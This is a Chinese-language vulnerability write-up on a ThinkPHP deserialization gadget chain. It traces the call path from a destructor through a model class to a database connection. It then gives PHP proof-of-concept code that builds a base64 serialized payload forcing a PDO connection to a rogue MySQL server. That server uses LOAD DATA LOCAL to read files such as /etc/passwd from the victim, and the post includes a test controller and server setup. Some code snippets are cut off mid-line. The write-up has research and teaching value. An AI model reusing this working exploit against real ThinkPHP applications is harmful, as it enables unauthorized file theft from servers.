    {
        $pk = $this->getTableInfo(is_array($options) ? $options['table'] : $options, 'pk');
    }
    ========
    think/db/Connection.php
    public function getTableInfo($tableName = '', $fetch = '')
    {
        $db = $this->getConfig('database');
        if (!isset(self::$info[$db . '.' . $guid])) {
            //前面的不太重要，一般都能调用到这里
            $info = $this->connection->getFields($guid);
        }
    }
    ========
    think/db/connector/Mysql.php
    public function getFields($tableName)
    {
        //sql语句
        $sql = 'SHOW COLUMNS FROM ' . $tableName;
        //调用query()
        $pdo = $this->query($sql, [], false, true);
    }
    ========
    think/db/Connection.php
    public function query($sql, $bind = [], $master = false, $pdo = false)
    {
        //数据库连接配置
        //这里会在下文详细说
        $this->initConnect($master);
        $this->PDOStatement = $this->linkID->prepare($sql);
        $this->PDOStatement->execute();
    }
**测试POC**
这里给出个POC，如果没看懂的话跟着POC开Debug走一走流程就明白调用过程了 = =
_备注：该POC运行到`think/db/Connection.php connect()` 将会由于没有传入正确数据库配置而报错停止运行。这里我们
**明白调用流程** 即可_
    files[] = new \think\model\Pivot();
            }        
        }
    }
    namespace{
        //入口点 __destruct()
        $a = new \think\process\pipes\Windows();
        echo base64_encode(serialize($a));
    }
    ?>
###  控制数据库配置
由于上文的POC在 `think/db/Connection.php
connect()`就抛出错误了。查看该方法，发现其进行了PDO连接数据库的操作，传入的配置为其成员变量。
这里值得注意的是，由于数据库驱动类是另外 `new`
出来的，所以反序列化无法直接控制其成员变量。我们只能通过给构造函数传参，在构造函数中控制部分成员变量。具体可看前文的流程图会清晰一些。
    //数据库配置格式
    //我们要构造的payload就按照这个数组来写
    protected $config = [
        'type'            => '',
        'hostname'        => '',
        'database'        => '',
        'username'        => '',
        'password'        => '',
        'hostport'        => '',
        ......
    ];
    //PDO配置
    protected $params = [
        PDO::ATTR_CASE              => PDO::CASE_NATURAL,
        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_ORACLE_NULLS      => PDO::NULL_NATURAL,
        PDO::ATTR_STRINGIFY_FETCHES => false,
        //该PDO配置将使得 LOAD DATA LOCAL 不成功
        //需要在connect()中将之覆写为true 
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
    public function connect(array $config = [], $linkNum = 0, $autoConnection = false)
    {
            $config = array_merge($this->config, $config);
            //控制$config['params']不为空且为数组，使程序进入if判读
            //覆写该类默认的$this->params[PDO::ATTR_EMULATE_PREPARES] 为true
            //这样我们 LOAD DATA LOCAL 才能成功
            if (isset($config['params']) && is_array($config['params'])) {
                $params = $config['params'] + $this->params;
            } else {
                $params = $this->params;
            }
            if (empty($config['dsn'])) {
                $config['dsn'] = $this->parseDsn($config);
            }
            $this->links[$linkNum] = new PDO($config['dsn'], $config['username'], $config['password'], $params);
        }
        return $this->links[$linkNum];
    }
**扩展** ：使用 `+` 拼接数组，后面的数组不会覆盖前面的数组值。但是使用 `array_merge` 将会覆盖前面的值：
     1
    ];
    $b = [
        'x' => 2,
        'v' => 3
    ];
    //使用 + 拼接数组
    //$c['x'] 还是1
    $c = $a+$b;
    //使用 array_merge 拼接数组
    //$d['x'] 被覆盖为2
    $d = array_merge($a,$b);
    ?>
根据上文的代码分析。我们可构建连接恶意Mysql数据库的配置。这里需要注意几点：
  1. ``PDO::MYSQL_ATTR_LOCAL_INFILE` 要设置为 **true** 。不然PDO无法进行 `LOAD DATA LOCAL` 操作
  2. `PDO::ATTR_EMULATE_PREPARES` 也要设置为 **true** 。不然`LOAD DATA LOCAL`会报错
  3. PDO连接恶意Mysql数据库 **不需要** 正确的用户名密码和库名。只要地址正确即可
初始化PDO连接后，`connect()` 将把PDO连接返回到 `query()`函数中，由这个函数执行 `PDOStatement execute()`
## 最终POC
搭建的恶意Mysql服务器选择 [Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)。可以通过编辑其 `rogue_mysql_server.py` 修改服务监听端口和被读取的文件：
    PORT = 3306
    .....
    filelist = (
        '/etc/passwd',
    )
修改POC，增加数据库配置：
     'mysql',
                // 服务器地址
                'hostname'        => '127.0.0.1',
                // 数据库名
                'database'        => 'xxx',
                // 用户名
                'username'        => 'xxx',
                // 密码
                'password'        => 'xxx',
                'params' => [
                    //让PDO能够执行LOAD DATA LOCAL
                    \PDO::MYSQL_ATTR_LOCAL_INFILE => true,
                    //重写配置，让PDO LOAD DATA LOCAL不报错
                    \PDO::ATTR_EMULATE_PREPARES  => true,
                ]
            ];
        }
    }
    namespace think\model{
        class Pivot extends \think\Model{
        }
    }
    namespace think\process\pipes{
        class Windows{
            private $files = [];
            public function __construct(){
                $this->files[] = new \think\model\Pivot();
            }        
        }
    }
    namespace{
        $a = new \think\process\pipes\Windows();
        echo base64_encode(serialize($a));
    }
    ?>
在TP的控制器处新建一个 `index.php`。写入如下测试代码：
    <?php
    namespace app\index\controller;
    class Index
    {
        public function index()
        {
           $a = base64_decode('生成的POC');
           unserialize($a);
        }
    }
开启Rogue Mysql：
    python rogue_mysql_server.py
访问测试文件，发现报了个错
查看日志，成功读取文件